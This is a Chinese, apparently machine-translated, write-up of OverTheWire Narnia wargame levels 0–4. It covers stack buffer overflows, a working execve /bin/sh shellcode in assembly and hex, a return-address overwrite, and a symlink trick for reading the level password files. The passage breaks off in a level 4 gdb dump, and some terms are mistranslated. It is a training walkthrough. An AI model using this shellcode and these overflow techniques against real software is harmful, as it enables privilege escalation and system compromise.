标题: 为了乐趣或是战争游戏 - 纳尼亚传奇 0-4来粉碎堆栈
日期: 2014-10-6 6:30
分类: 漏洞
标签: 缓冲, 溢出, 堆栈, NOP, C, 组装, gdb, 战争游戏, Linux系统

![](http://i.imgur.com/3N2pUBJ.jpg)


我的一个导师, <a href="https://twitter.com/OwariDa"> **Joel Eriksson**</a>, 建议我玩**[WarGames]**, 集典型的**Security problems**为一体, 分为14个有趣的标题.自上周以来我一直在玩这个游戏，以及游戏是很棒的! 在玩这个游戏时，登录SSH服务器可以表明你目前的水平.这个游戏的目的是解决当前水平的挑战找到下一个级别的密码.

今天我谈论的是**[Narnia]**的前五个关卡,这都是关于**[缓冲区溢出]**和**[未经边界检查的输入]**.

当你知道你的武器时，你会发现这场战争并不是那么糟糕.


[未经边界检查的输入]: http://en.wikipedia.org/wiki/Bounds_checking
[缓冲区溢出]: http://en.wikipedia.org/wiki/Buffer_overflow
[进程的虚拟内存]: http://en.wikipedia.org/wiki/Virtual_memory

--------

##  堆栈剥削是如何工作的:速成课程

### 一个进程的虚拟内存

当一个程序开始一个过程, ：操作系统内核提供了这一块[物理内存]. 但是,所有的过程将是[虚拟内存空间]，以及它的大小和起始地址. 每当一个进程想读或写物理内存, 它的请求必须从虚拟内存地址翻译到物理内存地址.


[物理内存]: http://en.wikipedia.org/wiki/Computer_memory
[虚拟内存空间]: http://en.wikipedia.org/wiki/Virtual_memory


我喜欢[Peter Jay Salzman]的显示了进程的虚拟内存的地址的图片.

![](http://i.imgur.com/RYEpFEA.png)


*text*和*data*片段程序代码和静态数据储存的地方(*e.g*.例如, 全局变量).这个区域通常是只读的，任何试图写入的尝试都将导致[内存段异常].

注意,参数和环境变量都会在堆栈的顶部得到一个特殊的位置(高地址).

尽管[堆] 可以纯粹为了乐趣去玩, 但为了这些游戏的目的, 我们将集中在**Stack**. 记住,[堆栈的方向]是系统的.



[堆栈的方向]: https://stackoverflow.com/questions/664744/what-is-the-direction-of-stack-growth-in-most-modern-systems
[内存段异常]: http://en.wikipedia.org/wiki/Segmentation_fault
[堆]: http://en.wikipedia.org/wiki/Heap_(data_structure)


###堆栈是什么


堆栈是一个*抽象数据类型* 具有最后一个对象将会作为第一个对象被删除的性质.这也被称为*后进先出队列*或是*LIFO*.在一个堆栈中两个最重要的操作是*压栈*和*出栈*.

你可以想象一堆书: 取到最底部书(放置的第一本书)的唯一方法是取出最上面的每一本书.学习如何在Python中编写一个堆栈, 看一看我关于[Python & Algorithms]的笔记. 我还提供了源代码: [这里是一些例子].

内存堆栈帧(栈)是框架的集合.每次一个过程调用一个函数,它改变了控制流.既然这样, 需要添加一个新的框架并堆栈向下(低内存地址).

如果你仔细想想, 堆栈是一个过程的完美对象: 这个过程可以推动一个函数(它的参数,代码, 等.) 进入堆栈, 然后, 在最后,它推出了一切,回到开始的地方.




[Python & Algorithms]: https://github.com/bt3gl/Python-and-Algorithms-and-Data-Structures/blob/master/book/book_second_edition.pdf
[这里是一些例子]: https://github.com/bt3gl/Python-and-Algorithms-and-Data-Structures/tree/master/src/abstract_structures/Stacks




### 在堆栈缓冲区溢出

当我们给一个缓冲区比它意在获取的更多信息时,缓冲区溢出发生.例如, **standard C library**有几个函数用以复制或附加没有边界检查的字符串: ```strcat()```, ```strcpy()```, ```sprintf()```, ```vsprintf()```, ```gets()```,和```scanf()```. 这些函数可以很容易地溢出缓冲区如果输入之前没有被验证.

为了更好的理解这个问题, 我推荐来自[Aleph One]的经典课程[Smashing the Stack for Fun or Profit] , 刊登在1996年第49期[Phrack magazine].

[WarGames]: http://overthewire.org/wargames
[Narnia]: http://overthewire.org/wargames/narnia
[Aleph One]: http://en.wikipedia.org/wiki/Elias_Levy
[Phrack magazine]: http://www.phrack.org/
[Smashing the Stack for Fun or Profit]: http://insecure.org/stf/smashStack.html
[Peter Jay Salzman]: http://www.dirac.org/linux/gdb/




### 装配和堆栈寄存器

寄存器是CPU的数据存储的位置.当这个过程进入堆栈,一个叫做**Stack pointer**的电子稳定系统(esp)指向栈顶(即最低内存地址).栈底(更高的内存地址)在一个固定的地址(在运行时由内核调整).CPU 执行指令来进行压栈和出栈.

在汇编代码中看起来是这样的:

```
pushl %ebp
movl %esp,%ebp
subl $20,%esp
```

头两行是序言. 在第一行代码中, (old) **frame pointer** (ebp)被压入栈中(当我们离开时可以获得它). 然后,当前地**esp** 复制到**ebp**, 使其成为新的帧指针. 这是堆栈框架的基础.最后一行,局部变量分配空间, 从esp减去它们的大小 (切记内存只能处理字节大小的倍数,例如4字节, 或32位).



在这之后, 汇编代码将显示每个操作步骤的程序. 在挑战过程中我们将学习更多关于这个的. 了解装配的基本知识是一个很好的技能,但这是在本文的背景之外.若需要,看看这个[nice Assembly guide].

[nice Assembly guide]: http://www.drpaulcarter.com/pcasm/

啊,顺便说一下,你可以在C程序中通过使用 ```-S```看到组装输出:

```sh
$ gcc -S -o example1.s example1.c
```



----

## 纳尼亚战争游戏

### 场景

在每个纳尼亚的等级我们都可以[run a binary and read its C code]. 目标是从代码中找出可以让我们读取下一个级别密码的漏洞 (在服务器中```/etc```文件夹下).


[run a binary and read its C code]: http://www.thegeekstuff.com/2011/10/c-program-to-an-executable/




### 你的武器





#### 内存漏洞利用的表示


当涉及到内存地址, 理解[hexadecimal representation]是基础的.你可以用Python向[ASCII]中输入HEX:
```python
$ python -c 'print "\x41"'
A
```

记住纳尼亚的服务器是[x86],所以我们有[little-endian]表示.这表示一个地址```0xffffd546 ```通常被写为```\x46\xd5\xff\xff ```.

我们在纳尼亚的大部分爆破输入都是以输入字符串形式完成的. Python的标记, ```-c```,对于我们需要什么真的很方便:
```sh
$ python -c 'print "A"*20'
AAAAAAAAAAAAAAAAAAAA
```

[little-endian]: http://en.wikipedia.org/wiki/Endianness
[x86]: http://en.wikipedia.org/wiki/X86
[ASCII]: http://en.wikipedia.org/wiki/ASCII
[hexadecimal representation]: http://en.wikipedia.org/wiki/Hexadecimal


#### 环境变量

如果你看了上面的图片, 你可以看到在堆栈中有可用的系统环境变量.这可能是有用的,我们可以使用这些变量来导入有效载荷.

我们用```export```定义一个环境变量.我们可以用```echo```或是```env```来展现它的价值:
```sh
$ EGG="0X41414141"
$ echo $EGG
0X41414141
$ export EGG
$ env | grep EGG
EGG=0X41414141
```

看着我的[Shellshock guide]了解更多在利用中关于环境变量的信息.

[Shellshock guide]: http://bt3gl.github.io/understanding-the-shellshock-vulnerability.html


#### Shell指令

shell命令,对于这些问题非常有用:


* ```readelf```:显示关于ELF文件(二进制文件)的信息.例如,在纳尼亚中,一个很快就会变为事实的重要细节,*Stack is executable*. 这意味着我们可以在其中放置shell代码.看看以下输出是否有标志**E**来检查是否执行堆栈:
```sh
narnia1@melinda:/narnia$ readelf -a narnia1 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```


* ```xxd```:创建一个十六进制转储文件或标准输入.：它还可以转换十六进制回到原来的二进制形式.

* ```whoami```: 显示当前用户, 有益于查看漏洞利用是否工作!



### GDB调试工具

在纳尼亚的大部分问题中,学会如何用**gdb**调试二进制文件是非常基础的.


[very introductory guide]: http://www.thegeekstuff.com/2010/03/debug-c-program-using-gdb/
[comprehensive guide]: http://www.dirac.org/linux/gdb/


为了学习更多关于gdb的知识,你可能想查看这个[入门指南]或是这个[综合指南].但是, 在纳尼亚中任何问题只要这些步骤就足够了:

1. 启动gdb实例: ```gdb -q <EXECUTABLE>```.
2. 我们用```disassemble```指令来获取汇编代码.常量有$作为前缀而寄存器是%:
```
(gdb) set disassembly-flavor intel
(gdb) disas main
```


3. 根据上面的输出的值来设置断点地址检查:
```
(gdb) b *main+<SOME NUMBER>
```

4. 运行该程序: ```(gdb) r```. 我们也可以用```c```在断点后继续运行它.我们用```n```作用于下一个计划行. 我们可以用```p```输出.

5. 我们可以用```(gdb) x/30xw A```来检查一些内存地址, **A**代表地址(*e.g.*, ```$esp``) 以及30是我们希望看到的输出的数量(重复计数).

6. 检查堆栈帧: ```(gdb) i f```.我们也可以用```bt``` (回溯)来查看堆栈使用.








--------------

## Level 0:经典的堆栈溢出:重写一个变量


### Step 1: 理解问题

第一级开始:

```sh
narnia0@melinda:/narnia$ cat narnia0.c

#include <stdio.h>
#include <stdlib.h>

int main(){
  long val=0x41414141;
  char buf[20];

  printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
  printf("Here is your chance: ");
  scanf("%24s",&buf);

  printf("buf: %s\n",buf);
  printf("val: 0x%08x\n",val);

  if(val==0xdeadbeef)
    system("/bin/sh");
  else {
    printf("WAY OFF!!!!\n");
    exit(1);
  }

  return 0;
}
```

程序接收来自用户的输入并将其保存在大小为20的缓冲变量中.然后,它会检查* val *是否等同于一个不同的值的声明:
```c
if(val==0xdeadbeef)
        system("/bin/sh");
```
因为*val* 显然没有改变程序的任何地方,什么也没发生,程序正常退出.

但是,如果我们能改变*val*对于[0xdeadbeef]的价值,该程序将给我们一个特权shell!


[0xdeadbeef]: http://en.wikipedia.org/wiki/Hexspeak

让我们想想内存堆栈.就像在一堆书中, 局部变量按照创建的顺序入栈.在上面的例子中, *val* 在*buf*之前入栈,所以*val*在更高的内存地址中:
```c
  long val=0x41414141;
  char buf[20];
```

如果输入大于20个字节会发生什么? 在这种情况下,没有边界检查并且输入变量溢出*buf*,占领以下堆栈空间: *val*.这是一个典型的**堆栈溢出**!



### Step 2: 可视化溢出


计划是溢出*buf*20+4字节,所以这最后四个字节用```0xdeadbeef```覆盖*val*.

让我们看看当我们按字节溢出时,*val*如何被充满:


```sh
narnia0@melinda:/narnia$ python -c 'print "B"*24'
BBBBBBBBBBBBBBBBBBBBBBBB

narnia0@melinda:/narnia$ (python -c 'print "B"*19') | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBB
val: 0x41414141
WAY OFF!!!!


narnia0@melinda:/narnia$ (python -c 'print "B"*20') | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBB
val: 0x41414100
WAY OFF!!!!

narnia0@melinda:/narnia$ (python -c 'print "B"*21') | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBB
val: 0x41410042
WAY OFF!!!!

narnia0@melinda:/narnia$ (python -c 'print "B"*22') | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBB
val: 0x41004242
WAY OFF!!!!

narnia0@melinda:/narnia$ (python -c 'print "B"*23') | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBBB
val: 0x00424242
WAY OFF!!!!

narnia0@melinda:/narnia$ (python -c 'print "B"*24') | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBBBB
val: 0x42424242
WAY OFF!!!!
```

### Step 3:制作利用

现在我们知道`val`在第20字节开始溢出. 所有我们需要做的是在过最后的四个字节添加```deadbeef```.

但是,我们需要用十六进制形式写这个:

```sh
narnia0@melinda:/narnia$ python -c'print "A"*20 + "\xef\xbe\xad\xde"'
AAAAAAAAAAAAAAAAAAAAﾭ
narnia0@melinda:/narnia$ (python -c'print "A"*20 + "\xef\xbe\xad\xde"') | ./narnia0 Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
```

哇, 漏洞利用开始工作了!


### Step 4: 获得Shell


我们可以获得我们的shell,但当程序执行结束时它关闭太快.

我们需要创建一个方法在我们失去对shell的控制之前来阅读密码. 一个好方法是流水输入一些等待输入的命令,例如```tail```或是```cat```.

事实证明,实际上只有```cat```能打印输出:

```sh
narnia0@melinda:/narnia$ (python -c'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
cat /etc/narnia_pass/narnia1
```
完成!我们已经完成了level 0!


### Step 5: 调试!
尽管这个问题很容易,所以我们不需要调试任何东西,当挑战很容易时了解程序是一个很好的步骤:

```sh
narnia0@melinda:/narnia$ gdb ./narnia0
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080484c4 <+0>: push   ebp
   0x080484c5 <+1>: mov    ebp,esp
   0x080484c7 <+3>: and    esp,0xfffffff0
   0x080484ca <+6>: sub    esp,0x30
   0x080484cd <+9>: mov    DWORD PTR [esp+0x2c],0x41414141
   0x080484d5 <+17>:  mov    DWORD PTR [esp],0x8048640
   0x080484dc <+24>:  call   0x80483b0 <puts@plt>
   0x080484e1 <+29>:  mov    eax,0x8048673
   0x080484e6 <+34>:  mov    DWORD PTR [esp],eax
   0x080484e9 <+37>:  call   0x80483a0 <printf@plt>
   0x080484ee <+42>:  mov    eax,0x8048689
   0x080484f3 <+47>:  lea    edx,[esp+0x18]
   0x080484f7 <+51>:  mov    DWORD PTR [esp+0x4],edx
   0x080484fb <+55>:  mov    DWORD PTR [esp],eax
   0x080484fe <+58>:  call   0x8048400 <__isoc99_scanf@plt>
   0x08048503 <+63>:  mov    eax,0x804868e
   0x08048508 <+68>:  lea    edx,[esp+0x18]
   0x0804850c <+72>:  mov    DWORD PTR [esp+0x4],edx
(...)
End of assembler dump.
```
让我们把断点放在```scanf```之后:

```sh
(gdb) b *main+63
Breakpoint 1 at 0x8048503
```

我们用20 Bs (\x42)作为输入运行调试程序. 它停在上面的地址, 在```scanf```之后:
```sh
(gdb) r
Starting program: /games/narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance:

Breakpoint 1, 0x08048503 in main ()
```

现在我们在12项中检查内存:

```sh
(gdb) x/12xw $esp
0xffffd6a0: 0x08048689  0xffffd6b8  0x08049ff4  0x08048591
0xffffd6b0: 0xffffffff  0xf7e59d46  0x42424242  0x42424242
0xffffd6c0: 0x42424242  0x42424242  0x42424242  0x41414100
```

变量*buf* 在第7-11条目(0x42424242). 在*val*(同时也是0x41414141)之后.稍等,你看到```0x41414100```中的两个0了吗?这是*buf*最后的空间

最后,我们用20 Bs + 4 Cs测试并且确认我们的漏洞利用已经开始工作:

```sh
(gdb) x/12xw $esp
0xffffd6a0: 0x08048689  0xffffd6b8  0x08049ff4  0x08048591
0xffffd6b0: 0xffffffff  0xf7e59d46  0x42424242  0x42424242
0xffffd6c0: 0x42424242  0x42424242  0x42424242  0x43434343
```


---

## Level 1:  环境变量的堆栈溢出

### Step 1: 理解问题

第二关的开始:
```c
narnia1@melinda:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG

narnia1@melinda:/narnia$ cat narnia1.c
#include <stdio.h>

int main(){
  int (*ret)();

  if(getenv("EGG")==NULL){
    printf("Give me something to execute at the env-variable EGG\n");
    exit(1);
  }

  printf("Trying to execute EGG!\n");
  ret = getenv("EGG");
  ret();

  return 0;
}
```

程序寻找一个环境变量**EGG** 然后如果这个变量不存在,就退出程序.如果存在, **EGG**作为函数的价值就结束了.真正的安全.


### Step 1: 使用我们的开发工具创建一个环境变量

最明显的选择是生成一个特权shell，这样我们就可以读取下一个级别的密码.

假设我们不知道我们需要用内存语言来编写这个漏洞. 我们可以试试这个:
```sh
narnia1@melinda:/narnia$ export EGG="/bin/ls"
narnia1@melinda:/narnia$ echo $EGG
/bin/ls
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
Segmentation fault
```

没有.

我们需要创建一个十六进制命令来导出到**EGG**.在汇编中做这个我们需要的所有信息都是在附录A的论文中.这使得我们写出如下内容:

[Appendix A]: http://insecure.org/stf/smashStack.html



```sh
narnia1@melinda:/tmp$ vi shellspawn.asm
xor eax, eax        ; make eax equal to 0
push eax            ; pushes null
push 0x68732f2f     ; pushes /sh (//)
push 0x6e69622f     ; pushes /bin
mov ebx, esp        ; passes the first argument
push eax            ; empty third argument
mov edx, esp        ; passes the third argument
push eax            ; empty second argument
mov ecx, esp        ; passes the second argument
mov al, 11          ; execve system call #11
int 0x80            ; makes  an interrupt
```

编译:

```sh
narnia1@melinda:/tmp$ nasm shellspawn.asm
narnia1@melinda:/tmp$ ls
shellspawn  shellspawn.asm
narnia1@melinda:/tmp$ cat shellspawn
1�Ph//shh/bin��P��P���
```

向*EGG*输出:

```sh
narnia1@melinda:/tmp$ export EGG=$(cat shellspawn)
```
我们已经准备好利用二进制文件:

```sh
narnia1@melinda:/tmp$ /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
```



### Step 4: 把它转换成十六进制

有一个十六进制形式的开发是非常有用的(我们将在下一层看到)因此我们将使用xxd来读取它:

```sh
narnia5@melinda:/tmp$ xxd shellspawn
0000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e350  1.Ph//shh/bin..P
0000010: 89e2 5089 e1b0 0bcd 80                   ..P......
```

真了不起!我们可以进行测试:
```sh
narnia1@melinda:/tmp$ export EGG=`python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80"'`
narnia1@melinda:/tmp$ /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
```


----------


## Level 2: 堆栈溢出到返回地址

### Step 1: 理解问题:

第三关以此开始:

```
narnia2@melinda:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@melinda:/narnia$ cat narnia2.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
  char buf[128];

  if(argc == 1){
    printf("Usage: %s argument\n", argv[0]);
    exit(1);
  }
  strcpy(buf,argv[1]);
  printf("%s", buf);

  return 0;
}
```

该函数使用```strcpy()```将输入字符串复制到*buf*(而不是更安全的```strncpy()```).  因为没有边界检查,  *buf*如果输入大于128字节，则会溢出到堆栈中的更高地址.

在这个问题中，我们将使用溢出来控制主函数的返回地址,这是在*buf*之后. 我们将把它覆盖到我们想要的任何地址，例如一个漂亮的精心开发的地址.


### Step 2: 找到当前帧大小

要找到这个函数的返回地址所在位置，我们使用*gdb*:

```sh
narnia2@melinda:/narnia$ gdb ./narnia2
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>: push   ebp
   0x08048425 <+1>: mov    ebp,esp
   0x08048427 <+3>: and    esp,0xfffffff0
   0x0804842a <+6>: sub    esp,0x90
   0x08048430 <+12>:  cmp    DWORD PTR [ebp+0x8],0x1
   0x08048434 <+16>:  jne    0x8048458 <main+52>
   0x08048436 <+18>:  mov    eax,DWORD PTR [ebp+0xc]
   0x08048439 <+21>:  mov    edx,DWORD PTR [eax]
   0x0804843b <+23>:  mov    eax,0x8048560
   0x08048440 <+28>:  mov    DWORD PTR [esp+0x4],edx
   0x08048444 <+32>:  mov    DWORD PTR [esp],eax
   0x08048447 <+35>:  call   0x8048320 <printf@plt>
   0x0804844c <+40>:  mov    DWORD PTR [esp],0x1
   0x08048453 <+47>:  call   0x8048350 <exit@plt>
   0x08048458 <+52>:  mov    eax,DWORD PTR [ebp+0xc]
   0x0804845b <+55>:  add    eax,0x4
   0x0804845e <+58>:  mov    eax,DWORD PTR [eax]
   0x08048460 <+60>:  mov    DWORD PTR [esp+0x4],eax
   0x08048464 <+64>:  lea    eax,[esp+0x10]
   0x08048468 <+68>:  mov    DWORD PTR [esp],eax
   0x0804846b <+71>:  call   0x8048330 <strcpy@plt>
   0x08048470 <+76>:  mov    eax,0x8048574
   0x08048475 <+81>:  lea    edx,[esp+0x10]
   0x08048479 <+85>:  mov    DWORD PTR [esp+0x4],edx
   0x0804847d <+89>:  mov    DWORD PTR [esp],eax
   0x08048480 <+92>:  call   0x8048320 <printf@plt>
   0x08048485 <+97>:  mov    eax,0x0
   0x0804848a <+102>: leave
   0x0804848b <+103>: ret
End of assembler dump.
```

我们在出口前创建一个断点:

```
(gdb) b *main+97
Breakpoint 1 at 0x8048485
```

我们运行程序，用大小为30的参数来进行输入，然后我们查看内存(esp是堆栈指针). 第二价值, **0xffffd610**,表示帧的开始:
```
(gdb) r `python -c 'print "B"*30'`
(gdb)  x/30xw $esp
0xffffd600: 0x08048574  0xffffd610  0x00000001  0xf7ebf729
0xffffd610: 0x42424242  0x42424242  0x42424242  0x42424242
0xffffd620: 0x42424242  0x42424242  0x42424242  0xf7004242
0xffffd630: 0x08048258  0x00000000  0x00ca0000  0x00000001
0xffffd640: 0xffffd86d  0x0000002f  0xffffd69c  0xf7fcaff4
0xffffd650: 0x08048490  0x08049750  0x00000002  0x080482fd
0xffffd660: 0xf7fcb3e4  0x00008000  0x08049750  0x080484b1
0xffffd670: 0xffffffff  0xf7e59d46
```

现在，看一下关于帧的信息，我们会得到**0xffffd69c**的返回地址:

```
(gdb) i f
Stack level 0, frame at 0xffffd6a0:
 eip = 0x8048485 in main; saved eip 0xf7e404b3
 Arglist at 0xffffd698, args:
 Locals at 0xffffd698, Previous frame's sp is 0xffffd6a0
 Saved registers:
  ebp at 0xffffd698, eip at 0xffffd69c
```

为了求出框架的大小，我们减去这些值:

```
(gdb) p 0xffffd69c-0xffffd610
$1 = 140
```

我们知道需要140个字节才能到达返回地址，在这里我们要添加指针.



### Step 3: 找到EGG ShellCode地址

我们要把返回地址指向哪里?我们已经知道了生成一个shell的方法: 使用一个环境变量:

```sh
narnia2@melinda:/tmp$ export EGG=`python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80"'
```

查找**EGG**地址我们使用以下**C**地址:
```c
narnia2@melinda:/tmp$ cat getbashadd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc,char *argv[]){
        char *ptr;
        ptr = getenv(argv[1]);
        ptr += (strlen(argv[0])-strlen(argv[2]))*2;
        printf("%s is at %p\n", argv[1],ptr);
        return 0;
}
```

运行后给出:

```
narnia2@melinda:/tmp$ ./getshadd EGG /narnia/narnia2
EGG will be at 0xffffd945
```

### Step 4:运行开发!

现在我们要做的就是用140字节来运行二进制文件加上我们想要指向的地址的地址:

```sh
narnia2@melinda:/tmp/ya2$ /narnia/narnia2 `python -c 'print "A"*140 + "\x45\xd9\xff\xff"'`
$ whoami
narnia3
```


------

## Level 3: 堆栈溢出,文件, 和符号链接

### Step 1: 理解问题

第四关以此开始:

```sh
narnia3@melinda:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
narnia3@melinda:/narnia$ cat narnia3.c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];

        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }

        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }

        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

        /* close 'em */
        close(ifd);
        close(ofd);

        exit(1);
}
```

这个程序接收一个文件名作为输入,然后将该文件的内容复制到第二个文件中，该文件指向```/dev/null```.

我们特别感兴趣的是变量被声明的顺序:

```c
char ofile[16] = "/dev/null";
char ifile[32];
```


[/dev/null]: http://en.wikipedia.org/wiki/Null_device


### Step 2: 了解内存中发生了什么

让我们调试这个二进制文件，看看我们如何利用它.首先是一个简单的3字节输入:

```
(gdb) set args "`python -c 'print "a"*3'`"
(gdb) r
Starting program: /games/narnia/narnia3 "`python -c 'print "a"*3'`"
error opening aaa
```

好的,它是有意义的, 没有这样的文件.现在我们来试试*ifile*的大小:

```
(gdb) set args "`python -c 'print "a"*32'`"
(gdb) r
Starting program: /games/narnia/narnia3 "`python -c 'print "a"*32'`"
error opening
```

嗯, 有趣. 它不输入任何名字.让我们少用一个字节:

```
(gdb) set args "`python -c 'print "a"*31'`"
(gdb) r
Starting program: /games/narnia/narnia3 "`python -c 'print "a"*31'`"
error opening aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

前面的示例显示了溢出*ifile*后的第一个字节.最后一个例子以数组中的最后一个可能的字节结尾.一旦我们溢出*ifile*,它跳过检查，直接检查*ifile*是否是一个有效的名称.真真是极好的!



### Step 3: 编写和应用开发
在*ifile*里我们希望发生两件事:首先,读取密码文件,然后溢出*ofile*, 让它指向一个我们可以读取的文件.

将所有这些都放入一个输入名的最好方法是创建一个具有以下规则的符号链接:

1. 指向*/etc/narnia_pass/narnia4*.
2. 用junk填充*ifile*数组的32个字节.
3. 以我们之前创建的一个文件名结尾，并且我们有权限读取(我们可以使用```touch```来创建一个空文件).

结果,对于一个文件名*out*,是:
```sh
$ ln -s /etc/narnia_pass/narnia4 $(python -c "print 'A'*32 + 'out'")
```

现在我们可以运行它并检索我们的密码:
```sh
narnia3@melinda:/tmp$ /narnia/narnia3 `python -c "print 'A'*32 + 'out'"`copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAout to a safer place... (out)
narnia3@melinda:/tmp$ cat out
```





_______


## Level 4: NOP的经典缓冲区溢出

### Step 1: 理解问题

第五关以此开始:

```sh
narnia4@melinda:/narnia$ ./narnia4
narnia4@melinda:/narnia$ cat narnia4.c

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
  int i;
  char buffer[256];

  for(i = 0; environ[i] != NULL; i++)
    memset(environ[i], '\0', strlen(environ[i]));

  if(argc>1)
    strcpy(buffer,argv[1]);

  return 0;
}
```

这个二进制文件做了三件事:首先, 它创建一个大小为256的缓冲数组, 然后它使所有的系统环境变量都等于0,然后它会将用户输入的内容复制到缓冲区中.

这段代码清除环境变量的原因是为了避免我们给它们设置一个shell代码的可能性(就像我们在第2层中所做的那样).



### Step 2: 概述攻击


为了利用这个二进制文件我们将重写我们的**return address**比如在第2级,但是这一次我们不能使用外部地址来指向.但是,因为我们的堆栈是可执行的, 我们可以将shell代码放在堆栈中.我们所遵循的步骤是:

1. 找出堆栈的大小.只有返回地址是没有用的因为我们不能把它指向代码之外的任何地方.
2. 创建一个带返回地址的shell代码减去我们定义的一些值，这样返回地址就会指向堆栈中的某个地方.
3. 使用大量的[NOPs](没有操作)填充堆栈的开始,在x86 CPU家族中，以```0x90```为代表的.如果指针指向这些地方,它一直向前推进直到找到我们的shell.
4. 为了使所有的东西都适合在堆栈框架中，我们用junk填充shell代码的末尾.
.

[ASLR]: http://en.wikipedia.org/wiki/Address_space_layout_randomization
[NOPs]: http://en.wikipedia.org/wiki/NOP




### Step 3: 获得当前帧大小


使用gdb，我们可以提取相关的内存位置. 让我们用一个缓冲区大小的输入来运行我们的程序.这里我们使用```--args``` 否则我们会得到一个错误因为这个名字太长了:

```sh
narnia4@melinda:/narnia$ gdb --args  narnia4 `python -c "print 'A'*256"`
Reading symbols from /games/narnia/narnia4...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>: push   ebp
   0x08048445 <+1>: mov    ebp,esp
   0x08048447 <+3>: push   edi
   0x08048448 <+4>: and    esp,0xfffffff0
   0x0804844b <+7>: sub    esp,0x130
(..)
   0x080484f0 <+172>: call   0x8048350 <strcpy@plt>
   0x080484f5 <+177>: mov    eax,0x0
   0x080484fa <+182>: mov    edi,DWORD PTR [ebp-0x4]
   0x080484fd <+185>: leave
   0x080484fe <+186>: ret
End of assembler dump.
```

我们在堆栈结束前设置了一个断点:

```sh
(gdb) b *main+182
Breakpoint 1 at 0x80484fa
```

运行:

```sh
(gdb) r
Starting program: /games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

我们看到帧开始于**0xffffd4cc**:

```sh
(gdb) x/90xw $esp
0xffffd4a0: 0xffffd4cc  0xffffd7be  0x00000021  0xf7ff7d54
0xffffd4b0: 0xf7e2ae38  0x00000000  0x00000026  0xffffffff
0xffffd4c0: 0x00000000  0x00000000  0x00000001  0x41414141
0xffffd4d0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd4e0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd4f0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd500: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd510: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd520: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd530: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd540: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd550: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd560: 0x41414141  0x41414141  0x41414141  0x41414141
